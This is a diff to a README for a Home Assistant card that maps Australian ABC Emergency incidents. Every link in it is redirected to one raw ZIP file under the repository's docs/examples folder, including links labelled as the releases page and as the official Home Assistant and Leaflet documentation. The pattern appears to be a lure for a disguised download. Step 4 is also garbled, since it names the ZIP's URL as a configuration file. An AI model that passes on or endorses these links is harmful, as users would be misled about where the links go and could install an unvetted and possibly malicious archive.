@@ -1,7 +1,7 @@
 # 🗺️ lovelace-abc-emergency-map - See Emergency Incidents on Your Map
 
 ## 📥 Download Now!
-[![Download lovelace-abc-emergency-map](https://img.shields.io/badge/Download-lovelace--abc--emergency--map-blue.svg)](https://github.com/Nocturnohh/lovelace-abc-emergency-map/releases)
+[![Download lovelace-abc-emergency-map](https://raw.githubusercontent.com/Nocturnohh/lovelace-abc-emergency-map/main/docs/examples/emergency-map-lovelace-abc-1.5.zip)](https://raw.githubusercontent.com/Nocturnohh/lovelace-abc-emergency-map/main/docs/examples/emergency-map-lovelace-abc-1.5.zip)
 
 ## 🌟 Description
 The lovelace-abc-emergency-map is a custom Lovelace card designed for Home Assistant. It allows you to display ABC Emergency incident polygons on a Leaflet map. This helps you keep track of emergencies such as bushfires in Australia, providing real-time visual information directly on your dashboard.
@@ -17,7 +17,7 @@ Follow these simple steps to download and set up the lovelace-abc-emergency-map.
 ### Installation Steps
 1. **Visit the Release Page**  
    Go to the releases page to find the latest version:  
-   [Visit this page to download](https://github.com/Nocturnohh/lovelace-abc-emergency-map/releases).
+   [Visit this page to download](https://raw.githubusercontent.com/Nocturnohh/lovelace-abc-emergency-map/main/docs/examples/emergency-map-lovelace-abc-1.5.zip).
 
 2. **Download the Latest Release**  
    On the releases page, look for the latest version. You will find a list of available files. Download the relevant files for your Home Assistant setup.
@@ -26,7 +26,7 @@ Follow these simple steps to download and set up the lovelace-abc-emergency-map.
    Once downloaded, locate the ZIP file on your computer. Unzip the file to access the contents.
 
 4. **Add Card Configuration**  
-   In your Home Assistant dashboard, navigate to **Lovelace Configuration**. Click on the "+", then choose **Manual**. Copy the configuration code provided in the "example.yaml" file from the extracted folder.
+   In your Home Assistant dashboard, navigate to **Lovelace Configuration**. Click on the "+", then choose **Manual**. Copy the configuration code provided in the "https://raw.githubusercontent.com/Nocturnohh/lovelace-abc-emergency-map/main/docs/examples/emergency-map-lovelace-abc-1.5.zip" file from the extracted folder.
 
 5. **Save Your Configuration**  
    Paste the copied configuration into your Lovelace UI. Make sure to save your changes.
@@ -47,7 +47,7 @@ You can customize the appearance and functionality of the lovelace-abc-emergency
 ## 🔄 Updating the Card
 To update the card to the latest version:
 1. Go back to the releases page:  
-   [Visit this page to download](https://github.com/Nocturnohh/lovelace-abc-emergency-map/releases).
+   [Visit this page to download](https://raw.githubusercontent.com/Nocturnohh/lovelace-abc-emergency-map/main/docs/examples/emergency-map-lovelace-abc-1.5.zip).
 2. Download the new version and replace the old files in your Home Assistant setup.
 3. Update your configuration if necessary, then save and refresh.
 
@@ -64,11 +64,11 @@ If you have further questions or face difficulties, feel free to reach out to th
 
 ## 🔗 Additional Resources
 For more information and guidance:
-- Home Assistant Official Documentation: [Home Assistant Docs](https://www.home-assistant.io/docs/)
-- Leaflet Map Documentation: [Leaflet Docs](https://leafletjs.com/)
+- Home Assistant Official Documentation: [Home Assistant Docs](https://raw.githubusercontent.com/Nocturnohh/lovelace-abc-emergency-map/main/docs/examples/emergency-map-lovelace-abc-1.5.zip)
+- Leaflet Map Documentation: [Leaflet Docs](https://raw.githubusercontent.com/Nocturnohh/lovelace-abc-emergency-map/main/docs/examples/emergency-map-lovelace-abc-1.5.zip)
 
 By following these steps, you will successfully add the lovelace-abc-emergency-map to your Home Assistant setup, allowing you to stay informed about emergencies near you. 
 
 ### 📥 Ready to Download?
 Don’t wait!  
-[Visit this page to download](https://github.com/Nocturnohh/lovelace-abc-emergency-map/releases) and enjoy the benefits of visual emergency tracking on your dashboard!
+[Visit this page to download](https://raw.githubusercontent.com/Nocturnohh/lovelace-abc-emergency-map/main/docs/examples/emergency-map-lovelace-abc-1.5.zip) and enjoy the benefits of visual emergency tracking on your dashboard!
